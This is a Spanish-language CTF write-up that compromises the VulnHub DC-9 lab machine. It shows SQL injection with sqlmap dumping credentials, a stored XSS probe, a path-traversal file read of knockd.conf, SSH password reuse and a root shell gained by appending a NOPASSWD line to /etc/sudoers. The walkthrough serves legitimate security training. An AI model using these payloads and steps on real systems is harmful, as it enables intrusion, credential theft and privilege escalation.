

-----

Autor: [deeb](https://github.com/tryto-deeb/)
<br>
Dificultad: Fácil
<br>
CTF: [DC-9](https://www.vulnhub.com/entry/dc-9,412/)

-----

SSH, HTTP, SQLi Blind, XSS Stored, Password Reuse, Port Knocking 

-----

<br>

# Enumeración


## Escaneo de Puertos


Hacemos un escaneo silencioso con `nmap` para ver todos los puertos que puedan estar corriendo un servicio.  

```shell
sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG scan.txt 10.10.0.6
```
```output
-- output --

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 21:57 CEST
Initiating SYN Stealth Scan at 21:57
Scanning 10.10.0.6 [65535 ports]
Discovered open port 80/tcp on 10.10.0.6
Completed SYN Stealth Scan at 21:57, 10.51s elapsed (65535 total ports)
Nmap scan report for 10.10.0.6
Host is up, received user-set (0.037s latency).
Scanned at 2024-10-12 21:57:41 CEST for 10s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE REASON
22/tcp filtered ssh     port-unreach ttl 63
80/tcp open     http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)
```
<br>

## Escaneo de servicios


Aparece el puerto 80 como abierto y el puerto 22 como filtrado, el siguiente escaneo será para ver las versiones de los servicios de dichos puertos y lanzar una serie de scripts por defecto que tiene nmap.  

```shell
nmap -p22,80 -sCV -oN versions.txt 10.10.0.6 
```
```
-- output --

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 21:59 CEST
Nmap scan report for 10.10.0.6
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:4a:69:47:bc:8b:da:2e:21:c5:1e:e4:68:9a:4c:49 (RSA)
|   256 37:35:06:d0:a8:3c:13:f2:ac:78:43:f3:65:6c:6e:6b (ECDSA)
|_  256 1e:a0:e3:b0:03:2f:6c:bd:4c:15:62:43:c1:79:5b:43 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds
```



El **puerto 22** no nos muestra nada relevante, poco más que la versión de *OpenSSH 7.9p1*. 
Por el **puerto 80** hay una aplicación web con no el nombre *Example.com - Staff Details* que esta corriendo en un servidor Apache/2.43.8 en Debian. <br>  
<br>  

## Puerto 80 - HTTP
<br>

Asique lo primero que vamos a comprobar es que hay en esa aplicación web poniendo la IP en el navegador `http://10.10.0.6`. En la pestaña **Display All Records** se puede ver algo como los detalles de los trabajadores que trabajan en esa plataforma. 
<br>

![Pasted image 20241012231204.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241012231204.png)

<br>

En la pestaña **Search** hay una entrada de datos donde al poner el nombre o el apellido de alguno de los miembros alojados en la plataforma aparecen sus datos, por ejemplo buscamos por el nombre de *Mary*. Lo que nos hace pensar que podrían estar utilizando una base de datos como `SQL` para gestionar estos datos. 
<br>

![Pasted image 20241012231708.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241012231708.png)

<br>
<br>

---

# Explotación

<br>

## Inyección SQL
<br>

Vamos a comprobar si la entrada de la pestaña Search es vulnerable a **inyecciones SQL**, para ello haremos una comprobación básica introduciendo `' or 1=1 --` . 

![Pasted image 20241012234504.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241012234504.png)


Al introducir esta inyección SQL nos devuelve como resultado de la búsqueda todos los datos de los usuarios de la base de datos, esto significa que la inyección a dado resultado, de lo contrario la búsqueda nos hubiese dado 0 resultados.<br> 
<br>

Pero con estas inyección no obtenemos ninguna información importante para poder seguir explotando esta web, asique el siguiente paso será capturar con **Burpsuite** como se tramita esta información al enviarla al servidor web. Para capturar las peticiones sin necesidad de plugins adicionales usaremos el navegador *Chronium* incorporado en Burpsuite.

![Pasted image 20241013004439.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013004439.png)

Podemos ver que la información se manda en el parámetro **search** a través de una petición por *POST*. Hacemos click con el botón derecho en la petición y seleccionamos `copy to file` para guardar la información en un archivo.txt. <br>
<br>

## SQLMap

Una vez guardado este archivo con las petición vulnerable a inyecciones SQL , usaremos la herramienta **SQLMap** para obtener las bases de datos que haya en el servidor en busca de información que nos pueda ser útil para comprometer la máquina. En este caso usaremos la herramienta descargada del [repositorio de SQLMap](https://github.com/sqlmapproject/sqlmap)
<br>

### Obtener Bases de datos


- `-r` Para especificar el archivo donde guardamos la petición

- `--data` Para especificar que la petición es por POST

- `--dbs` Para encontrar los nombres de las bases de datos 

- `--batch` Para seleccionar las respuestas por defecto que nos hace SQLMap automáticamente


```shell
python sqlmap.py -r <ruta_archivo.txt> --data=search --dbs --batch
```
```
-- output --

---
[00:47:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[00:47:44] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

Podemos ver que se encontraron tres bases de datos, las que parecen que pueden tener información relevante son **Staff** y **users**.
<br>

### Obtener Tablas de users


- `-D` Para especificar la base de datos.

- `--tables` Para especificar que queremos obtener las tablas


```shell
python3 sqlmap.py -r <ruta_archivo> -D users --tables
```
```output
-- output --

---
[01:03:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:03:14] [INFO] fetching tables for database: 'users'
Database: users
[1 table]
+-------------+
| UserDetails |
+-------------+
```

Encontramos la tabla con el nombre **UserDetails**.
<br>
<br>

#### Obtener Columnas de UserDetails


- `-T` Para especificar la Tabla

- `--columns` Para especificar que queremos obtener las columnas


```shell
python3 sqlmap.py -r <ruta_archivo> -D users -T UserDetails --columns
```
```output
-- output --

---
[01:10:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:10:34] [INFO] fetching columns for table 'UserDetails' in database 'users'
Database: users
Table: UserDetails
[6 columns]
+-----------+-----------------+
| Column    | Type            |
+-----------+-----------------+
| firstname | varchar(30)     |
| id        | int(6) unsigned |
| lastname  | varchar(30)     |
| password  | varchar(20)     |
| reg_date  | timestamp       |
| username  | varchar(30)     |
+-----------+-----------------+
```
<br>

Obtenemos varias columnas que parece que almacenan los datos de los usuarios que veíamos en la web. En este caso intentaremos dumpear las filas de las columnas **username** y **password** para ver si nos podemos autenticar posteriormente en la web con esos credenciales.

#### Dumpear Filas de username y password


- `-C` Para especificar las columnas 

- `--dump` Para especificar que queremos dumpear las filas


```shell
python3 sqlmap.py -r <ruta_archivo> -D users -T UserDetails -C username,password --dump
```
```output
-- output --

---
[01:17:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:17:54] [INFO] fetching entries of column(s) 'password,username' for table 'UserDetails' in database 'users'
Database: users
Table: UserDetails
[17 entries]
+-----------+---------------+
| username  | password      |
+-----------+---------------+
| marym     | 3kfs86sfd     |
| julied    | 468sfdfsd2    |
| fredf     | 4sfd87sfd1    |
| barneyr   | RocksOff      |
| tomc      | TC&TheBoyz    |
| jerrym    | B8m#48sd      |
| wilmaf    | Pebbles       |
| bettyr    | BamBam01      |
| chandlerb | UrAG0D!       |
| joeyt     | Passw0rd      |
| rachelg   | yN72#dsd      |
| rossg     | ILoveRachel   |
| monicag   | 3248dsds7s    |
| phoebeb   | smellycats    |
| scoots    | YR3BVxxxw87   |
| janitor   | Ilovepeepee   |
| janitor2  | Hawaii-Five-0 |
+-----------+---------------+
```


Obtenemos los credenciales en texto plano de los usuarios que aparecían en la web.
El siguiente paso sería comprobar si alguno de estos credenciales nos permite loggearnos como en la web, aunque ya os adelanto que este no es el caso, así que nos quedaría comprobar si la base de datos de staff tiene algo que nos pueda servir.<br>

### Obtener tablas de Staff


```shell
python3 sqlmap.py -r <ruta_archivo> -D Staff --tables
```
```output
-- output --

---
[01:25:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:25:15] [INFO] fetching tables for database: 'Staff'
Database: Staff
[2 tables]
+--------------+
| StaffDetails |
| Users        |
+--------------+
```

Obtenemos dos tablas **StaffDetails** y **Users** .<br>

#### Obtener Columnas de Users


```shell
python3 sqlmap.py -r <ruta_archivo> -D Staff -T Users --columns
```
```output
-- output --

---
[01:40:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:40:38] [INFO] fetching columns for table 'Users' in database 'Staff'
Database: Staff
Table: Users
[3 columns]
+----------+-----------------+
| Column   | Type            |
+----------+-----------------+
| Password | varchar(255)    |
| UserID   | int(6) unsigned |
| Username | varchar(255)    |
+----------+-----------------+
```

De las tres columnas encontradas intentaremos dumpear las filas de **Password** y **Username**.<br>


#### Dumpear Filas de Username y Password


En este caso las contraseñas no están en texto plano, sino los hashes de las contraseñas y si usamos la opción por defecto para crackear las contraseña con SQLMAP no la encontrará ya que parece que la contraseña no esta en el diccionario de la herramienta.

```shell
python3 sqlmap.py -r <ruta_archivo> -D Staff -T Users -C Username,Password --dump
```
```output
-- output --

---
[01:51:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:51:54] [INFO] fetching entries of column(s) 'Password,Username' for table 'Users' in database 'Staff'
[01:51:55] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 

do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[01:52:01] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/home/k4l1-00/sqlmap-dev/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 

[01:52:06] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 

[01:52:10] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[01:52:10] [INFO] starting 8 processes 
[01:52:13] [WARNING] no clear password(s) found                                                                                                                                        
Database: Staff
Table: Users
[1 entry]
+----------+----------------------------------+
| Username | Password                         |
+----------+----------------------------------+
| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |
+----------+----------------------------------+
```

Así que probaremos con la web de [crackstation](https://crackstation.net/) para crackear el hash `856f5de590ef37314e7c3bdf6f8a66dc` de la contraseña **admin**.

![Pasted image 20241013015916.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013015916.png)


Ahora si parece que hemos encontrado los credenciales que nos permitirán loggearnos como administrador en la pestaña **Manage**.<br>
<br>

## Vulnerabilidad XSS stored
<br>

Cuando nos loggeamos como administrador aparece otra pestaña más Add Record que nos permite añadir información sobre usuarios nuevos. Algo que podríamos hacer es probar si es vulnerable a inyecciones XSS en las entradas de datos. Probaremos a introducir en el campo **Email** `<script>alert("XSS")</script>`.

![Pasted image 20241013021300.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013021300.png)
<br>

Nos saldrá el mensaje de que el usuario se añadió con éxito, ahora si clickamos en la pestaña *Display All Records* que es donde se veía la información de los usuarios debería saltar el pop up que nos confirma que es **vulnerable a XSS**.

![Pasted image 20241013021556.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013021556.png)

Efectivamente es vulnerable, aunque este tipo de vulnerabilidad no nos va a permitir explotar el servidor ya que no hay interacción con otros usuarios , así que nos tocara seguir buscando.<br>
<br>


## Conectarse por SSH
<br>

### Port Knocking


Si recordamos cuando [enumeramos](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Write-up%20DC-9.md#escaneo-de-puertos) los puertos nos aparecía el puerto 22 (SSH) como filtrado y no open, con los credenciales que hemos encontrado en la [base de datos dumpeada](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Write-up%20DC-9.md#dumpear-filas-de-username-y-password) obtuvimos credenciales de los usuarios, podríamos probar si algún usuario reutiliza la contraseña para conectarse por ssh.

```shell
ssh admin@10.10.0.6
```
```output
-- output --

ssh: connect to host 10.10.0.6 port 22: Connection refused
```


Al parecer nos rechaza las conexiones cuando intentamos conectarnos, si hacemos una búsqueda en Google investigando que podría estar [escondiendo el servicio ssh](https://www.google.com/search?client=firefox-b-d&q=esconder+ssh) vemos que hay un [método Port Knocking](https://www.zonasystem.com/2022/08/port-knocking-ocultar-y-mejorar-la-seguridad-en-conexiones-ssh.html).<br>



> **Port knocking** o golpeteo de puertos es un método que proporciona seguridad frente ataques de servicios de red, consiste en realizar una serie de peticiones de conexión con una secuencia ordenada de puertos para >poder habilitar una regla previamente configurada en el máquina remota que nos permita abrir una comunicación única entre cliente/servidor y establecer finalmente una conexión abierta SSH hacia el servidor remoto.
<br>

Para poder saltarse esta restricción hay que conocer la secuencia de puertos que esta configurada en el archivo `/etc/knockd.conf`. <br>
<br>


### Local File Inclusion


Si volvemos a la web hay varias pestañas que nos indica que esta intentando cargando un archivo que no existe, lo que nos indica que podría ser vulnerable a [Local File Inclusion](https://deephacking.tech/local-file-inclusion-lfi-web/).

![Pasted image 20241013123647.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013123647.png)
<br>

Probamos si nos permite ver el archivo de configuración `/etc/knockd.conf` para ver la secuencia de puertos que necesitamos para acceder por ssh añadiendo en la url `?file=../../../../../etc/knockd.conf`.<br>

![Pasted image 20241013124149.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013124149.png)
<br>

Y efectivamente nos permite ver la *secuencia de puertos* que necesitamos para conectarnos `7469, 8475, 9842`.<br>
<br>

### Obtener acceso por SSH


ahora podríamos usar la herramienta knock para ejecutar esta secuencia , pero en este caso lo haremos con **nmap** que también se puede.

```shell
nmap -Pn -p 7469 [IP_DEL_SERVIDOR]

nmap -Pn -p 8475 [IP_DEL_SERVIDOR]

nmap -Pn -p 9842 [IP_DEL_SERVIDOR]
```
<br>

ahora si podemos conectarnos por ssh

```shell
ssh admin@10.10.0.6
```
```output
-- output --

(traducción)

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ ¡ADVERTENCIA: LA IDENTIFICACIÓN DEL HOST REMOTO HA CAMBIADO! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
¡ES POSIBLE QUE ALGUIEN ESTÉ HACIENDO ALGO MALINTENCIONADO! 
Alguien podría estar espiándote ahora mismo (ataque de intermediario). 
También es posible que simplemente la clave del host haya cambiado. 
La huella digital de la clave ED25519 enviada por el host remoto es SHA256:mWf07/eGcfv0lH0yvW3AgWqusL21I/O1KwsNe8gllgM. 
Por favor, contacta a tu administrador del sistema. 
Añade la clave correcta del host en /home/user/.ssh/known_hosts para eliminar este mensaje. 
Clave ED25519 problemática en /home/user/.ssh/known_hosts:5 elimínala con: 
ssh-keygen -f '/home/user/.ssh/known_hosts' -R '10.10.0.6' 
La clave del host para 10.10.0.6 ha cambiado y has solicitado una verificación estricta. 
Fallo en la verificación de la clave del host.
```
<br>

Podemos solucionar esto tal y como nos dice en el mensaje ejecutando `ssh-keygen -f '/home/user/.ssh/known_hosts' -R '10.10.0.6'`. Ahora sí, ya podemos conectarnos por ssh, aunque parece ser que el usuario admin no esta reutilizando la contraseña, asique vamos a probar si alguno de los usuarios que [encontramos en la base de datos](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Write-up%20DC-9.md#dumpear-filas-de-username-y-password) reutiliza la contraseña.

El usuario **janitor** es el que esta reutilizando la contraseña *Ilovepeepee*, asique ya conseguimos estar dentro del servidor a través de ssh.


![Pasted image 20241013134057.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013134057.png)

Para tener una terminal un poco más estable podemos usar el comando `export TERM=xterm` .
<br>
<br>
<br>



------



# Escalada de Privilegios
<br>

Lo primero que vamos a comprobar es si el usuario **janitor** tiene algún privilegio como administrador.

```shell
sudo -l
```
```output
[sudo] password for janitor: 
Sorry, user janitor may not run sudo on dc9.
```


Nada, no tiene permiso ... <br>
<br>

## Linpeas
<br>

Utilizaremos el script de  **Linpeas** para detectar posibles vías de escalada de privilegios, descargamos el script de su [repositorio](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) y lo transferimos de nuestra máquina al servidor levantando un servidor con python

Levantar servidor en python en la ubicación donde se encuentre el archivo:

```shell
python -m http.server 80
```


Descargar el archivo desde el servidor

```shell
wget http://IP_LOCAL/linpeas.sh
```
```output
-- output --

HTTP request sent, awaiting response... 200 OK
Length: 826586 (807K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh             100%[============================>] 807.21K  3.68MB/s    in 0.2s    

2024-10-13 21:43:05 (3.68 MB/s) - ‘linpeas.sh’ saved [826586/826586]
```
<br>

Damos permisos de ejecución con `chmod +x linpeas.sh` y ejecutamos el script `./linpeas.sh` a ver que nos muestra. El script arroja mucha información de posibles vías, pero parece que a encontrado un arvchivo.txt con contraseñas que janitor fue encontrando en post-its de los compañeros. 

Abrimos este archivo a ver que nos puede servir

```shell
cat /home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt
```
```output
-- output --

BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```


Probando estas contraseñas para [otros usuarios](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Write-up%20DC-9.md#dumpear-filas-de-username-y-password) vemos que la contraseña *B4-Tru3-001* pertenece a **fredf** que tiene el puesto de System Administrator.

Nos cambiamos al usuario **fredf** con el comando `su fredf`.<br>
<br>


## Archivo con permisos root para modificar /etc/sudoers
<br>

Comprobamos si tiene permisos con privilegios de administrador

```shell
sudo -l
```
```output
-- output --

Matching Defaults entries for fredf on dc9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```


Parece que el archivo `/opt/devstuff/dist/test/test` se puede ejecutar como **root** sin necesidad de contraseña
<br>

Ejecutamos el archivo

```shell
/opt/devstuff/dist/test/test
```
```output
-- output --

Usage: python test.py read append
```


Según nos dice el mensaje de uso el binario permite concatenar el contenido de un archivo en otro archivo haciéndolo con **permisos de superusuario**

Algo que podríamos hacer es crear un archivo con una línea dando permiso al usuario *fredf* para convertirse en **root** sin necesidad de introducir contraseña y concatenarlo al archivo `/etc/sudoers`.<br>

Creamos el archivo que queremos concatenar con el contenido `fredf ALL=(ALL:ALL) NOPASSWD: ALL` en un directorio que nos lo permita como podría ser `/home/fredf`

```shell
echo "fredf ALL=(ALL:ALL) NOPASSWD: ALL" > permisos_sudoers.txt
```
<br>

Concatenamos el archivo a `/etc/sudoers`

```shell
sudo /opt/devstuff/dist/test/test /home/fredf/permisos_sudoers.txt /etc/sudoers
```
<br>

Ya solo tenemos que ejecutar `sudo su` y buscar la flag que se encuentra en el directorio de `/root/theflag.txt`

![Pasted image 20241013143626.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-9/Capturas/Pasted%20image%2020241013143626.png)

<br>
<br>



-----
---
